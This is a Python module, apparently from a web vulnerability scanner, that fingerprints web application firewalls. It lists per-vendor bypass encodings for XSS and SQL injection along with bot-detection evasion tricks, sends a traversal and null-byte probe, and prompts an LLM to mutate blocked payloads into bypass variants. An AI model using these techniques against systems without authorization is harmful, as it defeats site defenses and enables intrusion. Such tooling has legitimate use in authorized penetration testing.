"""
WAF Auto-Detection and Bypass Strategy (A-2)
Detects WAF presence from HTTP response headers and body patterns,
then suggests WAF-specific bypass encodings via LLM or built-in rules.
"""
import re
import time
from typing import Optional
from urllib.parse import urlparse

import httpx


# ---------------------------------------------------------------------------
# WAF fingerprints
# ---------------------------------------------------------------------------

_WAF_SIGNATURES: list[tuple[str, str, str]] = [
    # (name, header_pattern, body_pattern)  — empty string = not checked
    ("Cloudflare",       r"cf-ray|cloudflare",              r"cloudflare"),
    ("AWS WAF",          r"x-amzn-requestid|x-amz-cf-id",   r"aws|request blocked"),
    ("Akamai",           r"akamai|x-check-cacheable",        r"access denied.*akamai"),
    ("Imperva/Incapsula",r"x-iinfo|incap_ses",               r"incapsula incident"),
    ("Sucuri",           r"x-sucuri-id|x-sucuri-cache",      r"sucuri website firewall"),
    ("ModSecurity",      r"",                                 r"mod_security|modsecurity|naxsi"),
    ("F5 BIG-IP ASM",    r"x-wa-info|bigip",                 r"the requested url was rejected"),
    ("Barracuda",        r"barra_counter_session",            r"barracuda networks"),
    ("DenyAll",          r"sessioncookie=",                   r"denyall"),
    ("FortiWeb",         r"fortiwafsid=",                     r"fortiweb"),
    ("Wallarm",          r"x-wallarm-",                       r"wallarm"),
    ("Wordfence",        r"",                                 r"wordfence"),
    ("DataDome",         r"x-datadome|datadome",              r"datadome|protected by datadome"),
    ("PerimeterX",       r"_pxhd|x-px-",                     r"perimeterx|px-block"),
    ("Generic WAF",      r"",                                 r"web application firewall|access denied|blocked by"),
]

# WAF-specific bypass strategies: WAF name → list of bypass hints
_WAF_BYPASSES: dict[str, list[str]] = {
    "Cloudflare": [
        "Double URL encode: %253Cscript%253E",
        "Unicode normalization: \\u003cscript\\u003e",
        "HTML entity bypass: &#x3C;script&#x3E;",
        "Case mutation: <ScRiPt>alert(1)</sCrIpT>",
        "Newline injection: <scr\nipt>alert(1)</scr\nipt>",
    ],
    "AWS WAF": [
        "Double encoding: %2527 for single quote",
        "Null byte insertion: payload%00suffix",
        "Parameter pollution: ?q=safe&q=<xss>",
        "Chunked transfer encoding tricks",
        "JSON body with Unicode escapes: \\u0022 for quotes",
    ],
    "ModSecurity": [
        "Comment insertion: un/**/ion sel/**/ect",
        "Case variation: SeLeCt 1,2,3",
        "Hex encoding: 0x53454c454354",
        "URL encoding mix: %u0053ELECT",
        "Operator substitution: 1 LIKE 1 instead of 1=1",
    ],
    "DataDome": [
        "Rotate user-agent to a legitimate browser string",
        "Add Accept-Language and Accept-Encoding headers matching real browsers",
        "Slow request rate; DataDome scores on traffic velocity",
        "Use residential proxy or real browser fingerprint",
    ],
    "PerimeterX": [
        "Execute JavaScript to obtain a valid _px cookie before probing",
        "Match browser TLS fingerprint (JA3 / JA4) to a real browser",
        "Mimic mouse-movement and page-interaction events",
        "Avoid headless browser fingerprint indicators (navigator.webdriver)",
    ],
    "Generic WAF": [
        "URL encoding: %3Cscript%3E",
        "Double URL encoding: %253Cscript%253E",
        "HTML entity encoding: &lt;script&gt;",
        "Case variation: <ScRiPt>",
        "Whitespace substitution: tab/newline instead of space",
        "Comment insertion: SELECT/**/1",
    ],
}


_DETECTION_TTL = 300  # seconds — re-probe if stale


class WAFDetector:
    """Detects WAF presence and suggests bypass strategies."""

    def __init__(self, payload_gen=None, proxy: str = "", headers_provider=None, tls_options_provider=None):
        self.payload_gen = payload_gen
        self.proxy = proxy or ""
        # Callable returning a dict of HTTP headers (pulls fresh values each call
        # so a rotated bearer token is used on every probe).
        self.headers_provider = headers_provider
        self.tls_options_provider = tls_options_provider
        self._detected: Optional[str] = None
        # follow_redirects=True で probe するため、判定は最終到達 origin を表す。
        # planner fingerprint を origin 別に出す際、WAF を実際に probe した origin にだけ
        # 帰属させるため、最終応答の origin を記録する（pre-redirect の target と食い違う）。
        self._detected_origin: Optional[str] = None
        self._checked_at: float = 0.0  # epoch seconds of last probe

    async def detect(self, url: str, timeout: float = 10.0) -> Optional[str]:
        """
        Probe the target URL and detect WAF type.
        Returns the detected WAF name or None.
        Cached for _DETECTION_TTL seconds to avoid redundant probes.
        """
        if self._checked_at and (time.monotonic() - self._checked_at) < _DETECTION_TTL:
            return self._detected
        self._checked_at = time.monotonic()

        try:
            extra_headers: dict = {}
            if self.headers_provider:
                try:
                    extra_headers = self.headers_provider(url) or {}
                except TypeError:
                    # Backward-compatible provider contract for standalone
                    # users/tests that still expose a zero-argument callable.
                    extra_headers = self.headers_provider() or {}
                except Exception:
                    extra_headers = {}
            tls_kwargs = self.tls_options_provider() if self.tls_options_provider else {"verify": False}
            async with httpx.AsyncClient(
                **{
                    **tls_kwargs,
                    "timeout": timeout,
                    "follow_redirects": True,
                    "proxy": self.proxy or None,
                    "headers": extra_headers,
                }
            ) as client:
                # First: normal request (collect always-present WAF headers)
                resp = await client.get(url)
                normal_headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                normal_body = resp.text[:5000].lower()

                # Second: benign-looking anomaly probe — path traversal fragment and
                # a custom tag are enough to trigger most WAF rule sets without
                # resembling a real exploit that IDS/abuse filters flag.
                # 既存クエリがある URL でも壊れない正しい区切りで連結する
                # （?x=1 のとき "?x=1?wscan=..." にしない）。
                _sep = "&" if urlparse(url).query else "?"
                probe_url = url + _sep + "wscan=..%2F..%2F&x=%00<wscan-probe>"
                resp2 = await client.get(probe_url)
                waf_headers = {k.lower(): v.lower() for k, v in resp2.headers.items()}
                waf_body = resp2.text[:5000].lower()
                # 一致した応答の origin を帰属に使う（normal と probe が別 origin に
                # 到達し得るため、どちらで当たったかで記録を分ける）。
                try:
                    from wscan.header_scope import _url_origin
                    normal_origin = _url_origin(str(resp.url)) or None
                    probe_origin = _url_origin(str(resp2.url)) or None
                except Exception:
                    normal_origin = probe_origin = None
        except Exception:
            return None

        # Check for WAF signatures in the triggered response
        for name, header_pat, body_pat in _WAF_SIGNATURES:
            header_str = " ".join(f"{k}: {v}" for k, v in waf_headers.items())
            if header_pat and re.search(header_pat, header_str, re.IGNORECASE):
                self._detected = name
                self._detected_origin = probe_origin
                return name
            if body_pat and re.search(body_pat, waf_body, re.IGNORECASE):
                self._detected = name
                self._detected_origin = probe_origin
                return name

        # Check normal response headers too (some WAFs add headers always)
        for name, header_pat, body_pat in _WAF_SIGNATURES:
            if not header_pat:
                continue
            header_str = " ".join(f"{k}: {v}" for k, v in normal_headers.items())
            if re.search(header_pat, header_str, re.IGNORECASE):
                self._detected = name
                self._detected_origin = normal_origin
                return name

        return None

    def get_bypass_hints(self, waf_name: Optional[str] = None) -> list[str]:
        """Return bypass strategy hints for the detected (or specified) WAF."""
        name = waf_name or self._detected or "Generic WAF"
        return _WAF_BYPASSES.get(name, _WAF_BYPASSES["Generic WAF"])

    async def get_bypass_payloads_llm(
        self,
        waf_name: str,
        check_type: str,
        original_payload: str,
    ) -> list[str]:
        """
        Ask the LLM for WAF-specific bypass payloads for a given check type.
        Falls back to built-in hints on error.
        """
        if not self.payload_gen:
            return []
        hints = "\n".join(f"- {h}" for h in self.get_bypass_hints(waf_name))
        prompt = (
            f"A {waf_name} WAF is blocking {check_type} payloads. "
            f"Known bypass strategies for this WAF:\n{hints}\n\n"
            f"The original payload that was blocked: {original_payload}\n\n"
            f"Generate 5 WAF-bypass variants of this payload using the strategies above. "
            f"Return ONLY a JSON array of strings."
        )
        try:
            result = await self.payload_gen._call_llm(prompt)
            return result or []
        except Exception:
            return []

    def summary(self) -> str:
        if self._detected:
            return f"WAF detected: {self._detected}"
        return "No WAF detected"


# ── G6: WAF ブロック応答フィードバック（純関数・テスト可能） ──────────────
# 生きた WAF バイパス経路は adaptive（AdaptivePayloadEngine.generate の waf_name 節）。
# 試行台帳（G1/G2/G3）の per-payload status を使い、passed（アプリ到達）/ blocked
# （WAF が弾いた）に分けて adaptive プロンプトへ供給し、狙いを絞らせる。
# 判定はせず観測の整形のみ（通常層＝確実性、LLM は攻撃入力生成だけ）。

# WAF ブロックに特徴的な HTTP ステータス。403/406 は WAF が拒否する際の代表値。
# 400/401/404/422/500 等はアプリ由来（バリデーション/認証/NotFound/サーバエラー）なので
# ここに含めない（アプリに到達した payload を誤って「WAF に弾かれた」と扱わないため）。
# body/一致ルールは試行台帳が非保持なので status ベースに留める（過剰ラベルより取りこぼし側）。
_WAF_BLOCK_STATUSES = frozenset({403, 406})


def is_waf_block_attempt(status, error: bool = False) -> bool:
    """1 試行が **WAF 固有の signal** でブロックされたか（純粋）。WAF 検出済み前提でも、
    汎用のアプリエラー（400/401/404/422/500 等）や無関係な transport 失敗はブロックと
    みなさない（unknown 扱い）。WAF 代表ステータス（403/406）のみ True。"""
    return isinstance(status, int) and status in _WAF_BLOCK_STATUSES


def format_waf_block_analysis(entries, waf_name, *, max_each: int = 6, max_len: int = 120) -> str:
    """試行台帳エントリ（.payload/.status/.error を持つ）を passed/blocked に分け、
    adaptive プロンプト用の WAF フィードバック節へ整形する（純粋・bounded）。全空なら ""。"""
    if not waf_name or not entries:
        return ""

    def _clip(p) -> str:
        return str(p or "").replace("\r", " ").replace("\n", " ")[:max_len]

    # 同一 payload が retry で 403 と 2xx の両方を受けることがあるため、payload ごとに
    # **最新の試行結果**へ集約してから分類する（両リストへの二重掲載を防ぐ・後勝ち）。
    # dict は挿入順を保つので、value を上書きしても初出順で列挙できる。
    last_by_payload: dict = {}
    for e in entries:
        try:
            payload = _clip(getattr(e, "payload", ""))
        except Exception:
            continue
        if payload:
            last_by_payload[payload] = e

    blocked: list[tuple[str, int]] = []
    passed: list[str] = []
    for payload, e in last_by_payload.items():
        status = getattr(e, "status", None)
        reflected = bool(getattr(e, "reflected", False))
        if is_waf_block_attempt(status):
            blocked.append((payload, status))
        elif isinstance(status, int) and 200 <= status < 300 and reflected:
            # 2xx だけでは不十分（WAF のソフトブロック/CAPTCHA/challenge も 200 になり得る）。
            # payload が本文に反射した＝アプリが実際に処理した確証があるときだけ passed とする。
            passed.append(payload)

    if not blocked and not passed:
        return ""

    lines: list[str] = [
        f"## WAF ({str(waf_name)[:60]}) response analysis "
        f"(prefer shapes that PASSED, avoid the BLOCKED ones)"
    ]
    if blocked:
        lines.append("Payloads BLOCKED by the WAF (HTTP 403/406):")
        for p, code in blocked[:max_each]:
            lines.append(f"- {p}  -> {code}")
    if passed:
        lines.append("Payloads that PASSED to the application (HTTP 2xx and reflected):")
        for p in passed[:max_each]:
            lines.append(f"- {p}")
    return "\n".join(lines)
